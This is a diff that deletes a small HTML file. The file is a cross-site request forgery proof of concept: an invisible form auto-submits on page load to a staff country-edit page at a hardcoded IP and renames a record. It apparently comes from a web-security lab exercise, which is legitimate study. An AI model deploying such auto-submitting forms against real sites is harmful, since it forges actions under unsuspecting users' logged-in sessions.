@@ -1,9 +1,0 @@
-<html>
-  <body onload="document.update_US.submit()">
-  <form action="https://35.184.88.145/red/public/staff/countries/edit.php?id=1" method="post" name="update_US" style="display: none;">    
-    <input type="text" name="name" value="EL SALVADORRRRR" />
-    <input type="text" name="code" value="ESA" />
-    <input type="text" name="country_id" value="1" />
-  </form>
-  </body>
-</html>
